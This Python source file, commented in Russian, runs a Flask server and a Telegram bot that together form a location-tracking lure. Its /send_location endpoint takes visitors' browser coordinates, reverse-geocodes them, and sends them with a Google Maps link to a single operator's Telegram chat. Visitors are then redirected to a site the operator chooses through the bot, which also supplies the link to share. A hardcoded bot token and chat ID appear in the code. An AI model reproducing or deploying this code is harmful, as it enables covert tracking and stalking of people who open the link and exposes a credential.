from flask import Flask, request, send_from_directory, jsonify
import telebot
from telebot import types
import threading
from flask_cors import CORS
import os
import requests

# === Flask app ===
app = Flask(__name__, static_folder='static')
CORS(app)

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888  # Только ты

bot = telebot.TeleBot(BOT_TOKEN, threaded=True)  # threaded=True — важно

# URL редиректа, можно менять через бота
redirect_url = "https://yandex.ru"

# 🔁 Роут: отдать HTML
@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

def get_location_name(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={lat}&lon={lon}"
        headers = {'User-Agent': 'GeoBot'}
        res = requests.get(url, headers=headers, timeout=5)
        json_data = res.json()
        return json_data.get('display_name', 'Неизвестное место')
    except Exception as e:
        print(f"Geocode error: {e}")
        return 'Неизвестное место'


# 📡 Получение геолокации от клиента
@app.route('/send_location', methods=['POST'])
def receive_location():
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    if lat and lon:
        location_name = get_location_name(lat, lon)
        bot.send_message(CHAT_ID,
            f"📍 Новая геолокация:\n"
            f"Широта: {lat}\n"
            f"Долгота: {lon}\n"
            f"🌆 Место: {location_name}\n"
            f"🌐 [Открыть в Google Maps](https://www.google.com/maps?q={lat},{lon})",
            parse_mode="Markdown"
        )
        bot.send_location(CHAT_ID, latitude=lat, longitude=lon)
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400


# 🔁 Вернуть текущий redirect_url
@app.route('/get_redirect')
def get_redirect():
    return jsonify({"redirect_url": redirect_url})

# === Telegram bot ===
RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'
user_waiting_for_url = set()

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.chat.id != CHAT_ID:
        bot.reply_to(message, "🚫 Доступ запрещён.")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('Изменить редирект', 'Скинуть ссылку')
    bot.send_message(message.chat.id, "Выбери действие:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == 'Изменить редирект')
def ask_redirect(message):
    if message.chat.id != CHAT_ID:
        return
    bot.send_message(message.chat.id, "Пришли новую ссылку для редиректа (http:// или https://):")
    user_waiting_for_url.add(message.chat.id)

@bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url)
def set_redirect_from_message(message):
    global redirect_url
    url = message.text.strip()
    if url.startswith('http://') or url.startswith('https://'):
        redirect_url = url
        bot.send_message(message.chat.id, f"✅ Редирект установлен на:\n{url}")
        user_waiting_for_url.remove(message.chat.id)
    else:
        bot.send_message(message.chat.id, "❌ Ссылка должна начинаться с http:// или https://")

@bot.message_handler(func=lambda m: m.text == 'Скинуть ссылку')
def send_render_link(message):
    if message.chat.id != CHAT_ID:
        return
    bot.send_message(message.chat.id, f"Вот твоя ссылка:\n{RENDER_URL}")

# === Запуск ===
def run_bot():
    try:
        bot.remove_webhook()
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Ошибка при запуске бота: {e}")

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
